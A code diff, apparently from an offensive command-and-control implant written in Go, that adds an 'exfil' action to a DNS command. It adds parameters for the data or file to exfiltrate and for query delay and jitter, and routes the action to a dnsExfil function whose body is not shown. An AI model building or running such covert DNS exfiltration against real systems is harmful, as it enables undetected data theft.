@@ -19,10 +19,13 @@ func (c *DnsCommand) Description() string {
 }
 
 type dnsArgs struct {
-	Action  string `json:"action"`  // resolve, reverse, srv, mx, ns, txt, cname, all, dc, zone-transfer
+	Action  string `json:"action"`  // resolve, reverse, srv, mx, ns, txt, cname, all, dc, zone-transfer, exfil
 	Target  string `json:"target"`  // hostname, IP, or domain
 	Server  string `json:"server"`  // DNS server (optional, required for zone-transfer)
 	Timeout int    `json:"timeout"` // timeout in seconds (default: 5)
+	Data    string `json:"data"`    // Data to exfiltrate (exfil action: file path or raw string)
+	Delay   int    `json:"delay"`   // Delay between DNS queries in ms (exfil, default: 100)
+	Jitter  int    `json:"jitter"`  // Random jitter 0-N ms added to delay (exfil, default: 50)
 }
 
 func (c *DnsCommand) Execute(task structs.Task) structs.CommandResult {
@@ -35,12 +38,12 @@ func (c *DnsCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorf("Error parsing parameters: %v", err)
 	}
 
-	if args.Target == "" {
+	if args.Target == "" && args.Action != "exfil" {
 		return errorResult("Error: target is required")
 	}
 
 	if args.Action == "" {
-		return errorResult("Error: action required. Valid: resolve, reverse, srv, mx, ns, txt, cname, all, dc, zone-transfer, wildcard")
+		return errorResult("Error: action required. Valid: resolve, reverse, srv, mx, ns, txt, cname, all, dc, zone-transfer, wildcard, exfil")
 	}
 
 	if args.Timeout <= 0 {
@@ -88,8 +91,10 @@ func (c *DnsCommand) Execute(task structs.Task) structs.CommandResult {
 		return dnsAXFR(ctx, args)
 	case "wildcard":
 		return dnsWildcard(ctx, resolver, args)
+	case "exfil":
+		return dnsExfil(args)
 	default:
-		return errorf("Error: unknown action %q. Valid: resolve, reverse, srv, mx, ns, txt, cname, all, dc, zone-transfer, wildcard", args.Action)
+		return errorf("Error: unknown action %q. Valid: resolve, reverse, srv, mx, ns, txt, cname, all, dc, zone-transfer, wildcard, exfil", args.Action)
 	}
 }
 
